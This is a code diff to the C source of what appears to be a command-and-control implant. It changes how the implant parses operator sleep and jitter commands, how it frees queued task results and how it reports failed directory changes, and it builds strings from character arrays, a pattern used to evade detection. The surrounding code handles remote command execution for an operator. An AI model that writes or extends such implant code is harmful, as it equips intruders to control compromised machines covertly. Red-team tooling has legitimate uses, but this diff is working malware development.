@@ -112,7 +112,7 @@ static void store_task_result(IMPLANT_CONTEXT *ctx, const char *task_id,
     if (ctx->task_result_count >= MAX_TASK_RESULTS) {
         /* Result queue full — drop oldest to make room */
         if (ctx->task_results[0].data) {
-            /* Cannot free in PIC without VirtualFree — just overwrite */
+            task_free(ctx->task_results[0].data);
         }
         /* Shift results left */
         for (DWORD i = 0; i < MAX_TASK_RESULTS - 1; i++) {
@@ -336,40 +336,56 @@ static void task_cmd_exec(IMPLANT_CONTEXT *ctx, TASK *task) {
 /* ------------------------------------------------------------------ */
 
 /**
- * Parse sleep task data: [interval_ms: u32 LE][jitter_percent: u8]
- * Updates the implant config's sleep_interval and sleep_jitter.
+ * Parse sleep task data.
+ * Accepts ASCII text ("60" or "60 15") from Web UI / TUI,
+ * or binary LE u32 + u8 from raw task payloads.
+ * Always tries ASCII first to avoid misinterpreting ASCII bytes as u32.
  */
 static void handle_sleep_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     IMPLANT_CONFIG *cfg = cfg_get(ctx);
-    if (!cfg) {
+    if (!cfg || !task->data || task->data_len == 0) {
         store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
         return;
     }
 
-    if (task->data && task->data_len >= 4) {
-        /* Read interval (LE u32, in seconds) */
-        DWORD interval = (DWORD)task->data[0] |
-                         ((DWORD)task->data[1] << 8) |
-                         ((DWORD)task->data[2] << 16) |
-                         ((DWORD)task->data[3] << 24);
-        cfg->sleep_interval = interval;
+    /* Always try ASCII parsing first: "60" or "60 15" */
+    DWORD interval = 0;
+    DWORD jitter = 0;
+    DWORD i = 0;
+    BOOL is_ascii = FALSE;
 
-        /* Read jitter percent (u8, optional) */
-        if (task->data_len >= 5) {
+    /* Check if first byte is an ASCII digit */
+    if (task->data[0] >= '0' && task->data[0] <= '9') {
+        is_ascii = TRUE;
+        /* Parse interval */
+        while (i < task->data_len && task->data[i] >= '0' && task->data[i] <= '9') {
+            interval = interval * 10 + (task->data[i] - '0');
+            i++;
+        }
+        /* Skip whitespace */
+        while (i < task->data_len && (task->data[i] == ' ' || task->data[i] == '\t'))
+            i++;
+        /* Parse optional jitter */
+        while (i < task->data_len && task->data[i] >= '0' && task->data[i] <= '9') {
+            jitter = jitter * 10 + (task->data[i] - '0');
+            i++;
+        }
+    }
+
+    if (is_ascii && interval > 0) {
+        cfg->sleep_interval = interval;
+        if (jitter > 0 && jitter <= 100)
+            cfg->jitter_percent = jitter;
+    } else if (task->data_len >= 4) {
+        /* Binary fallback: [u32 LE interval_secs][u8 jitter_percent] */
+        interval = (DWORD)task->data[0] |
+                   ((DWORD)task->data[1] << 8) |
+                   ((DWORD)task->data[2] << 16) |
+                   ((DWORD)task->data[3] << 24);
+        if (interval > 0)
+            cfg->sleep_interval = interval;
+        if (task->data_len >= 5)
             cfg->jitter_percent = (DWORD)task->data[4];
-        }
-    } else if (task->data && task->data_len > 0) {
-        /* Try parsing as ASCII number string for simple "sleep 10" style */
-        DWORD val = 0;
-        for (DWORD i = 0; i < task->data_len; i++) {
-            BYTE c = task->data[i];
-            if (c >= '0' && c <= '9') {
-                val = val * 10 + (c - '0');
-            } else if (c == ' ' || c == '\0') {
-                break;
-            }
-        }
-        if (val > 0) cfg->sleep_interval = val;
     }
 
     store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, NULL, 0);
@@ -410,9 +426,12 @@ static void handle_cd_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     path_buf[copy] = 0;
 
     BOOL ok = pSetDir(path_buf);
-    store_task_result(ctx, task->task_id,
-                      ok ? TASK_STATUS_COMPLETE : TASK_STATUS_FAILED,
-                      NULL, 0);
+    if (!ok) {
+        char err[] = {'d','i','r','e','c','t','o','r','y',' ','n','o','t',' ','f','o','u','n','d',0};
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, (BYTE*)err, 19);
+    } else {
+        store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, NULL, 0);
+    }
 }
 
 /* ------------------------------------------------------------------ */
